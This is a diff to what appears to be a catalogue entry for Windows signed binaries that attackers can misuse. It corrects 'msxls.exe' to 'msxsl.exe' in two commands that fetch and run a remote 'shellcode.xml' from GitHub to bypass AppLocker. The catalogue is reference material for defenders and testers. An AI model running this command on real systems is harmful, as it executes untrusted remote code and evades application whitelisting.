@@ -18,14 +18,14 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows
-  - Command: msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
+  - Command: msxsl.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
     Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
     Usecase: Local execution of remote script stored in XSL script stored as an XML file.
     Category: Execute
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows
-  - Command: msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
+  - Command: msxsl.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
     Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
     Usecase: Local execution of remote script stored in XSL script stored as an XML file.
     Category: AWL Bypass
